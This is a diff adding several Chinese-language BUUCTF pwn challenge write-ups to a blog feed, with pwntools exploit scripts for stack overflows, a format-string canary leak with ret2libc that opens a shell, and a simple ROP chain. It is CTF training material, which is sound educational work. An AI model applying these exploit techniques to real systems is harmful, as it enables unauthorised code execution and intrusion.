@@ -7301,6 +7301,73 @@
 <p>这里感觉很奇怪，长度0x88可以返回，但是不知道为什么不+8这个rbp的长度</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(elf.sym[<span class="string">&#x27;good_game&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd] ydsneedgirlfriend2"></a>[BJDCTF 2nd] ydsneedgirlfriend2</h2><p>首先checsec</p>
+<p><img src="buuctf-pwn1/image-20201202153315584.png" alt="image-20201202153315584"></p>
+<p>64位程序，IDA打开看是一个堆题，先放一放；</p>
+<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>首先checksec</p>
+<p><img src="image-20201202153827176.png" alt="image-20201202153827176"></p>
+<p>发现是64位程序</p>
+<p><img src="image-20201202153955291.png" alt="image-20201202153955291"></p>
+<p>main函数首先输入了一个长度，之后用read读了这个长度的内容</p>
+<p>感觉是整形溢出</p>
+<p>另外还存在一个backdoor</p>
+<p><img src="image-20201202154037653.png" alt="image-20201202154037653"></p>
+<p>很简单，长度输入-1绕过之后直接返回到backdoor就完了</p>
+<p>脚本就不贴了</p>
+<h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h2><p>checksec</p>
+<p><img src="image-20201202155611805.png" alt="image-20201202155611805"></p>
+<p>本来还以为是类似于测试nc这样一连上去就有flag，结果并不是</p>
+<p><img src="image-20201202155655176.png" alt="image-20201202155655176"></p>
+<p>main函数用随机数种子生成了一个数组，之后输出</p>
+<p><img src="image-20201202155718603.png" alt="image-20201202155718603"></p>
+<p>在这个mem_test里面有输出一个hint的地址，这个地址是cat flag这个字符串的地址</p>
+<p><img src="image-20201202155926210.png" alt="image-20201202155926210"></p>
+<p>这里的scanf会导致溢出，其实前面的东西没有那么关键</p>
+<p>另外有一个win_func后门函数</p>
+<p><img src="image-20201202155856509.png" alt="image-20201202155856509"></p>
+<p>直接在scanf这里溢出，返回到system调用<code>cat flag</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27258</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./memory&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./memory&#x27;</span>)</span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">0x80487e0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>这是一道64位的ROP</p>
+<p><img src="image-20201202161419033.png" alt="image-20201202161419033"></p>
+<p>开启了canary栈保护</p>
+<p>程序流程主要是首先一个gift输出了一些内容，之后vuln溢出</p>
+<p><img src="image-20201202161745504.png" alt="image-20201202161745504"></p>
+<p>vuln中的read导致溢出</p>
+<p><img src="image-20201202161808839.png" alt="image-20201202161808839"></p>
+<p>gift中其实也存在这样一个格式化字符串的漏洞</p>
+<p>这里应该是要用printf来泄漏栈中canary的值</p>
+<p>之后用read来ret2libc</p>
+<p>那么首先来找format的偏移</p>
+<p>一个一个尝试之后发现偏移在<code>%6$p</code>这里</p>
+<p><img src="image-20201202171146730.png" alt="image-20201202171146730"></p>
+<p>看到gift的代码中，保存cookie的v2在<code>rbp-8h</code>，格式化字符串在<code>rbp-10h</code>，两者差了8</p>
+<p>正好是一个参数的距离，所以cookie的位置应该就是<code>%7$p</code></p>
+<p>确定了这个cookie之后，那么第一次使用printf首先得到输出的canary值</p>
+<p>之后在构造栈上的填充时把这些内容放上去就可以了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(canary) + bytes(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>之后就是常规的ret2libc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27445</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;help u!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;%7$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">canary = int(io.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400991</span></span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(canary) + bytes(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_real = io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">read_real = u64(read_real)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_real)</span><br><span class="line">libc_base = read_real - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;help u!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;%7$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">canary = int(io.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(canary) + bytes(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="picoctf-2018-ropchain"><a href="#picoctf-2018-ropchain" class="headerlink" title="picoctf_2018_ropchain"></a>picoctf_2018_ropchain</h2><p><img src="image-20201202190558416.png" alt="image-20201202190558416"></p>
+<p>32位程序</p>
+<p>这道题目的想法应该是想让人按照顺序调用相应的函数</p>
+<p><img src="image-20201202190746145.png" alt="image-20201202190746145"></p>
+<p>之后直接用这个flag读取相应的值</p>
+<p>调用到这里的话需要三个条件，win1、win2都为真，并且a1是一个特定的值</p>
+<p>win1可以直接调用；win2需要参数是一个特定值</p>
+<p><img src="image-20201202192532128.png" alt="image-20201202192532128"></p>
+<p>整体很基础，就是最简单的构造ROP链</p>
+<p>记得把调用win2的参数pop出来就可以</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28619</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">popebx_ret = <span class="number">0x804840d</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&#x27;</span>)</span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(elf.sym[<span class="string">&#x27;win_function1&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;win_function2&#x27;</span>]) + p32(popebx_ret) + p32(<span class="number">0xBAAAAAAD</span>) + p32(elf.sym[<span class="string">&#x27;flag&#x27;</span>]) + p32(popebx_ret) + p32(<span class="number">0x0deadbaad</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>buuctf</category>
